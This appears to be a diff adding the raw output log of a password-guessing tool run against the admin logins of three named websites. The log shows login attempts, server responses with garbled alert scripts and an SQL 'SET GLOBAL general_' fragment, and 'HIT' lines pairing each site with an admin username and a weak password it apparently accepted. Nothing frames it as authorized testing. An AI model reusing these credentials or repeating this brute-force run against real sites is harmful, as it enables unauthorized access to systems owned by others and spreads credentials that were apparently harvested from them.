@@ -1,0 +1,12 @@
+[www.yangsha.com] starting 36 passwords
+[szsadwj.com] starting 38 passwords
+[www.yangsha.com] CHECK : <script>alert('瀵杈ラ璇锛');history.back();</script>//' SET GLOBAL general_
+[www.yangsha.com] CHECK admin@123: <script>alert('瀵杈ラ璇锛');history.back();</script>//' SET GLOBAL general_
+[gdcq119.com] starting 38 passwords
+RESULT: ('HIT', 'www.yangsha.com', 'admin', 'admin1234', 'empty-resp')
+RESULT: ('HIT', 'szsadwj.com', 'admin', 'admin@123', 'empty-resp')
+RESULT: ('HIT', 'gdcq119.com', 'admin', 'admin123', 'empty-resp')
+=== ALL DONE: 3 hits ===
+HIT: HIT	www.yangsha.com	admin	admin1234	empty-resp
+HIT: HIT	szsadwj.com	admin	admin@123	empty-resp
+HIT: HIT	gdcq119.com	admin	admin123	empty-resp
